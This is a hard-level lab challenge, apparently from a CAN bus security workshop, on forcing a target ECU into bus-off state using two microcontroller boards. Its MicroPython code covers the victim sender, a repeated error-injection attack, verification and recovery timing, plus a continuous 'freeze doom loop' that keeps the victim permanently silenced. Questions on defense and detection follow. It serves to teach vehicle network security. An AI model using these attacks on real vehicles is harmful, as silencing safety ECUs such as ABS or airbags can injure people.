# Challenge 5: Bus-Off Attack — Silencing an ECU
**Difficulty:** 🔴 Hard | **Time:** 40 min | **Boards:** 2

## 🎯 Objective
Force a target CAN node into **bus-off** state — permanently disconnecting it from the bus. This is one of the most devastating CAN attacks: imagine silencing the ABS or airbag ECU.

## 📖 Background
The CAN protocol has three error states:
1. **Error Active** (TEC < 128): Normal operation, sends active error frames
2. **Error Passive** (128 ≤ TEC < 256): Can still transmit but with restrictions
3. **Bus-Off** (TEC ≥ 256): **Completely disconnected** from the bus

By repeatedly injecting errors during a target's transmissions, we can drive its TEC to 256 and force it bus-off. The target must see 128 occurrences of 11 consecutive recessive bits to recover — which takes significant time.

## 🔬 Exercise

### Part A: Observe error-counter accumulation
The bus-off demonstration uses `error_attack(repeat=...)`. Each successful error
injection normally increases the target transmitter's TEC by 8; the exact
counter progression depends on whether the final retry succeeds.

**Board B — victim ECU sending periodic frames:**
```python
from rp2 import CAN, CANFrame, CANID
from utime import sleep_ms

c = CAN()
count = 0

while True:
    f = CANFrame(CANID(0x200), data=bytes([count & 0xFF]))
    try:
        c.send_frame(f)
        count += 1
    except Exception as e:
        bus_off, error_passive, tec, rec = c.get_status()
        state = 'bus-off' if bus_off else 'error-passive' if error_passive else 'error-active'
        print(f"[{count}] ERROR: {e}")
        print(f"  TEC={tec} REC={rec} State={state}")
        if state == 'bus-off':
            print("*** BUS-OFF! ECU is silenced! ***")
            break
    
    if count % 10 == 0:
        _, _, tec, rec = c.get_status()
        print(f"[{count}] TEC={tec} REC={rec}")
    sleep_ms(100)
```

### Part B: Execute the bus-off attack
**Board A — drive the victim to bus-off:**
```python
from rp2 import CAN, CANHack

c = CAN(tx_open_drain=True)
ch = CANHack()

# Target: ID 0x200
ch.set_frame(can_id=0x200, data=bytes(8))
# Repeat the error attack many times
# Each repeat injects an error at the end of the target frame
# TEC increases by 8 per error, so ~32 attacks → bus-off (256/8 = 32)
print("Launching bus-off attack on ID 0x200...")
timed_out = ch.error_attack(repeat=40)
print(f"Attack timed out: {timed_out}")
```

### Part C: Verify bus-off
**Board A — check if the victim is silenced:**
```python
from rp2 import CAN
from utime import sleep_ms

c = CAN()

# Listen for 5 seconds — should see NO frames from ID 0x200
print("Listening for victim frames...")
for i in range(50):
    frames = c.recv()
    for frame in frames:
        print(f"  Received: {frame}")
    sleep_ms(100)
print("Done — if no 0x200 frames appeared, victim is bus-off")
```

### Part D: Recovery timing
**Board B — how long does recovery take?**
After bus-off, the CAN controller must detect 128 occurrences of 11 consecutive recessive bits before it can rejoin the bus.

```python
from rp2 import CAN
from utime import ticks_ms, ticks_diff

c = CAN()

# Wait for recovery
start = ticks_ms()
while c.get_status()[0]:
    pass
end = ticks_ms()

print(f"Recovery took {ticks_diff(end, start)} ms")
bus_off, error_passive, tec, rec = c.get_status()
state = 'bus-off' if bus_off else 'error-passive' if error_passive else 'error-active'
print(f"TEC={tec} REC={rec} State={state}")
```

### Part E: The "Freeze Doom Loop"
What if the attacker keeps attacking even during recovery? The victim can never rejoin:

```python
from rp2 import CAN, CANHack

c = CAN(tx_open_drain=True)
ch = CANHack()

ch.set_frame(can_id=0x200, data=bytes(8))
# Continuous attack — victim can never recover
print("Freeze doom loop — victim permanently silenced")
print("Press Ctrl+C to stop")
while True:
    ch.error_attack(repeat=10)
```

**⚠️ This is the most dangerous CAN attack — in a real car, this could permanently disable safety systems.**

**Questions:**
1. How many error injections does it take to reach bus-off?
2. How long does recovery take with no interference?
3. Can the victim ever recover during a doom loop?
4. What defenses exist against bus-off attacks?
5. How would you detect this attack from a monitoring node?

## 📝 What to Share
- TEC progression to bus-off (how many steps?)
- Recovery time measurement
- Discussion: real-world implications (ABS, airbag, steering)
- Proposed defense mechanisms

## 🏆 Stretch
- [ ] Calculate the theoretical minimum time to bus-off at 500 kbps
- [ ] Implement a "bus-off detector" on a third monitoring board
- [ ] Research: how do real OEMs protect against bus-off attacks?
- [ ] Can you selectively bus-off one ECU while keeping others alive?
